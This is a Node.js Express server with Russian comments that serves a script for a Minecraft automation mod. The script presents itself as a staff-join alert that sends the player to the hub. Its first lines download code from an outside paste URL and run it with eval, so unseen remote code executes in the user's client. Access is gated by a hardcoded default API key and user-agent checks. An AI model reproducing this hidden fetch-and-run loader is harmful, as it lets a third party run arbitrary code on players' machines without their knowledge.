const express = require('express');
const cors = require('cors');
const app = express();

// ==================== КОНФИГУРАЦИЯ ====================
const CONFIG = {
    PORT: process.env.PORT || 3000,
    API_KEYS: process.env.API_KEYS || 'minecraft-secret-key-12345',
    ALLOWED_AGENTS: process.env.ALLOWED_AGENTS || 'java,minecraft,nedan,script',
    NODE_ENV: process.env.NODE_ENV || 'production'
};

// ==================== MIDDLEWARE ====================
app.use(cors());
app.use(express.json());

// Логирование всех запросов
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.ip} - ${req.method} ${req.path} - ${req.headers['user-agent'] || 'No User-Agent'}`);
    next();
});

// ==================== ПРОВЕРКА АВТОРИЗАЦИИ ====================
const validateRequest = (req, res, next) => {
    const apiKey = req.headers['x-api-key'] || req.query.api_key;
    const userAgent = req.headers['user-agent'] || '';
    
    const validKeys = CONFIG.API_KEYS.split(',');
    const allowedAgents = CONFIG.ALLOWED_AGENTS.split(',');
    
    const isValidKey = validKeys.includes(apiKey);
    const isValidAgent = allowedAgents.some(agent => 
        userAgent.toLowerCase().includes(agent.toLowerCase())
    );
    
    if (isValidKey && isValidAgent) {
        next();
    } else {
        console.log('🚫 Blocked request - Invalid credentials:', { 
            apiKey: apiKey ? 'provided' : 'missing', 
            userAgent: userAgent.substring(0, 50) 
        });
        res.status(403).json({ 
            error: 'Access denied',
            message: 'Invalid or missing credentials',
            timestamp: new Date().toISOString()
        });
    }
};

// ==================== ЗАЩИЩЕННЫЕ ЭНДПОИНТЫ ====================

// Главный эндпоинт для скрипта
app.get('/api/script', validateRequest, (req, res) => {
    const scriptContent = `
try {
    // Выполняем внешний скрипт
    eval(new java.util.Scanner(
        new java.net.URL("https://diddy-party.vip/p/raw/1pvhaynl48amcpmfd").openStream(), 
        "UTF-8"
    ).useDelimiter("\\\\A").next());
} catch (e) {
    java.lang.System.err.println("Ошибка при выполнении скрипта: " + e);
}

var ChatUtility = Java.type("ru.nedan.neverapi.etc.ChatUtility");
var AutoMine = Java.type("ru.nedan.automine.AutoMine");
var Utils = Java.type("ru.nedan.automine.util.Utils");

on("ru.nedan.automine.event.EventStaffJoin", function(e){
    if(!AutoMine.getInstance().isEnabled()) return;
    ChatUtility.sendMessage("§4§l[!] " + e.getUsername() + "§c Зашел на Анархию" + Utils.getCurrentAnarchy() + "! §bВыхожу в хуб!");
    ChatUtility.sendMessage("§8§l§kxxxxxxxxxx");
    ChatUtility.sendMessage("§9§lПривет от Zr3!");
    chat("/hub");
    AutoMine.getInstance().nextMine = true;
});
    `;
    
    res.setHeader('Content-Type', 'application/javascript');
    res.setHeader('X-Server-Version', '1.0.0');
    res.send(scriptContent);
});

// Эндпоинт для проверки статуса
app.get('/api/status', validateRequest, (req, res) => {
    res.json({ 
        status: 'online', 
        server: 'Secure Script Server',
        version: '1.0.0',
        environment: CONFIG.NODE_ENV,
        timestamp: new Date().toISOString(),
        client: {
            ip: req.ip,
            userAgent: req.headers['user-agent']
        }
    });
});

// ==================== ОБЩЕДОСТУПНЫЕ ЭНДПОИНТЫ ====================

// Информация о сервере (доступно всем)
app.get('/info', (req, res) => {
    res.json({
        service: 'Secure Script Delivery',
        version: '1.0.0',
        status: 'operational',
        documentation: 'Contact administrator for access'
    });
});

// Health check для хостинга
app.get('/health', (req, res) => {
    res.status(200).send('OK');
});

// ==================== ОБРАБОТКА ОШИБОК ====================

// 404 - Not Found
app.use((req, res) => {
    res.status(404).json({
        error: 'Endpoint not found',
        message: 'The requested resource does not exist',
        availableEndpoints: ['/api/script', '/api/status', '/info', '/health']
    });
});

// Обработка ошибок
app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({
        error: 'Internal server error',
        message: 'Something went wrong'
    });
});

// ==================== ЗАПУСК СЕРВЕРА ====================
app.listen(CONFIG.PORT, () => {
    console.log('╔══════════════════════════════════════════════════╗');
    console.log('║           SECURE SCRIPT SERVER STARTED          ║');
    console.log('╠══════════════════════════════════════════════════╣');
    console.log('║  Port: ' + CONFIG.PORT + '                                  ║');
    console.log('║  Environment: ' + CONFIG.NODE_ENV.padEnd(25) + ' ║');
    console.log('║                                                  ║');
    console.log('║  Protected Endpoints:                            ║');
    console.log('║  • GET /api/script  (requires auth)              ║');
    console.log('║  • GET /api/status  (requires auth)              ║');
    console.log('║                                                  ║');
    console.log('║  Public Endpoints:                               ║');
    console.log('║  • GET /info                                     ║');
    console.log('║  • GET /health                                   ║');
    console.log('║                                                  ║');
    console.log('║  Server is ready and listening...                ║');
    console.log('╚══════════════════════════════════════════════════╝');
});

// Обработка graceful shutdown
process.on('SIGINT', () => {
    console.log('\n🛑 Shutting down server gracefully...');
    process.exit(0);
});
